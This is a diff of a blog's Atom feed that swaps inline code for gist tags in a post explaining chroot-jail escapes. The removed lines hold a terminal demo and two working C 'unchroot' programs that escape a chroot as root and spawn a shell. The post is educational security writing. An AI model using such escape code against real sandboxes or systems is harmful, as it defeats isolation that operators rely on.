@@ -4,7 +4,7 @@
   <title><![CDATA[Category: security | PyTux]]></title>
   <link href="http://filosottile.github.com/categories/security/atom.xml" rel="self"/>
   <link href="http://filosottile.github.com/"/>
-  <updated>2013-10-26T19:14:47-04:00</updated>
+  <updated>2013-10-26T19:15:27-04:00</updated>
   <id>http://filosottile.github.com/</id>
   <author>
     <name><![CDATA[Filippo Valsorda]]></name>
@@ -39,58 +39,7 @@
 <p>Q: Why couldn’t we just do <code>chroot("../../../../../../..")</code> and call it a day?<br />
 A: Because even if the kernel does not want to keep us from doing what we want (we’re root, after all) it will keep faith to the chroot also with us and if from inside the chroot jail we ask to <code>chroot("..")</code> the kernel will regularly expand <code>/..</code> to <code>/</code>. It has to do so, some programs might rely on that. So we have to move our working directory outside of the root before proceeding.</p>
 
-<p><div><script src='https://gist.github.com/6976188.js?file=unchroot.txt'></script>
-<noscript><pre><code>$ echo 1337 | sudo tee /FLAG
-1337
-$ mkdir chroot
-$ cd chroot/
-$ mkdir bin etc lib var home
-$ ln -s lib lib64
-$ ldd /bin/sh
-    linux-vdso.so.1 =&gt;  (0x00007fffa9c83000)
-    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a29106000)
-    /lib64/ld-linux-x86-64.so.2 (0x00007f9a294d8000)
-$ cp /bin/sh bin
-$ cp /lib/x86_64-linux-gnu/libc.so.6 lib
-$ cp /lib64/ld-linux-x86-64.so.2 lib
-$ tree
-.
-├── bin
-│   └── sh
-├── etc
-├── home
-├── lib
-│   ├── ld-linux-x86-64.so.2
-│   └── libc.so.6
-├── lib64 -&gt; lib
-└── var
-
-6 directories, 3 files
-$
-$ cat &gt; unchroot.c
-#include &lt;sys/stat.h&gt;
-#include &lt;unistd.h&gt;
-
-int main() {
-    mkdir(&quot;.42&quot;, 0755);
-    chroot(&quot;.42&quot;);
-    chroot(&quot;../../../../../../../../../../../../../../../..&quot;);
-    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
-}
-$ gcc -static -o unchroot unchroot.c
-$
-$ sudo chroot . /bin/sh
-# ls
-/bin/sh: 1: ls: not found
-# ./unchroot
-# ls
-bin    dev   home            lib         media  proc  sbin     sys  var
-boot   etc   initrd.img      lib64       mnt    root  selinux  tmp  vmlinuz
-cdrom  FLAG  initrd.img.old  lost+found  opt    run   srv      usr  vmlinuz.old
-# cat FLAG
-1337
-#</code></pre></noscript></div>
-</p>
+<p>{% gist 6976188 unchroot.txt %}</p>
 
 <h2 id="other-pitfalls">Other pitfalls</h2>
 
@@ -113,24 +62,7 @@ setuid(UID);
 
 <h2 id="a-catch-all-compile-everywhere-c-unchroot">A catch-all compile-everywhere C <code>unchroot</code></h2>
 
-<p><div><script src='https://gist.github.com/6976188.js?file=unchroot.c'></script>
-<noscript><pre><code>#include &lt;sys/stat.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
-
-int main() {
-    int dir_fd, x;
-    setuid(0);
-    mkdir(&quot;.42&quot;, 0755);
-    dir_fd = open(&quot;.&quot;, O_RDONLY);
-    chroot(&quot;.42&quot;);
-    fchdir(dir_fd);
-    close(dir_fd);  
-    for(x = 0; x &lt; 1000; x++) chdir(&quot;..&quot;);
-    chroot(&quot;.&quot;);  
-    return execl(&quot;/bin/sh&quot;, &quot;-i&quot;, NULL);
-}</code></pre></noscript></div>
-</p>
+<p>{% gist 6976188 unchroot.c %}</p>
 
 <div class="footnotes">
   <ol>
